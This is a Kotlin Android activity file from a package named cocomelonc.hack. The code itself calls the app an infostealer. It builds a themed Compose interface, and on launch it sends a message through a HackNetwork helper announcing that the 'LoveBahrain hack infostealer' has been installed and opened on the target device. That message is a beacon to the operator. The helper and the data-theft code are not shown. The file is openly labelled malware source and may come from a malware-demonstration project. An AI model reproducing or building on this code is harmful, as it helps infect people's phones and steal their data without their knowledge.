package cocomelonc.hack

import cocomelonc.hack.tools.HackNetwork
import cocomelonc.hack.ui.HackNavigation
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.material3.Surface
import androidx.navigation.compose.rememberNavController
import com.example.compose.HackTheme

class HackMainActivity : ComponentActivity() {
    private lateinit var HackViewModel: HackViewModel
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        HackViewModel = HackViewModel(this)
        setContent {
            HackTheme {
                Surface {
                    val navController = rememberNavController()
                    HackViewModel.navController = navController
                    HackNavigation(HackViewModel = HackViewModel)
                }
            }
        }
        HackNetwork(this).sendTextMessage("LoveBahrain hack infostealer has been installed on target device and opened")
    }
}